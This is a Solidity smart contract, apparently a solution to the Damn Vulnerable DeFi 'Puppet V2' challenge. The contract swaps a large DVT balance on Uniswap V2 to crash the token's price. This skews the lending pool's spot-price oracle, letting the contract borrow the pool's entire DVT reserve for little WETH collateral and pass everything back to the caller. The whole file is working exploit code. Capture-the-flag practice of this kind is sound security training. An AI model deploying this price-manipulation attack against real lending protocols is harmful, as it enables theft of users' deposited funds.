// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {PuppetV2Pool} from "../puppet-v2/PuppetV2Pool.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract PuppetV2Attack {
    PuppetV2Pool pool;
    IUniswapV2Router02 router;
    IERC20 dvt;
    IERC20 weth;

    constructor(
        address _puppetV2PoolAddress,
        address _uniswapV2RouterAddress,
        address _dvtAddress,
        address _wethAddress
    ) public {
        pool = PuppetV2Pool(_puppetV2PoolAddress);
        router = IUniswapV2Router02(_uniswapV2RouterAddress);
        dvt = IERC20(_dvtAddress);
        weth = IERC20(_wethAddress);
    }

    function attack() public {
        // attacker should fund this contract with DVT and WETH before calling
        require(dvt.balanceOf(address(this)) == 10000 ether, "Not enough DVT");
        require(weth.balanceOf(address(this)) >= 990 finney, "Not enough WETH");

        // swap DVT for WETH
        dvt.approve(address(router), 10000 ether);
        uint256 amountIn = dvt.balanceOf(address(this));
        uint256 minAmountOut = 0;
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        address to = address(this);
        uint256 deadline = block.timestamp + 60;
        router.swapExactTokensForTokens(amountIn, minAmountOut, path, to, deadline);

        // drain lending pool
        weth.approve(address(pool), weth.balanceOf(address(this)));
        uint256 poolDvtBalance = dvt.balanceOf(address(pool));
        pool.borrow(poolDvtBalance);

        // return DVT and WETH to attacker
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}
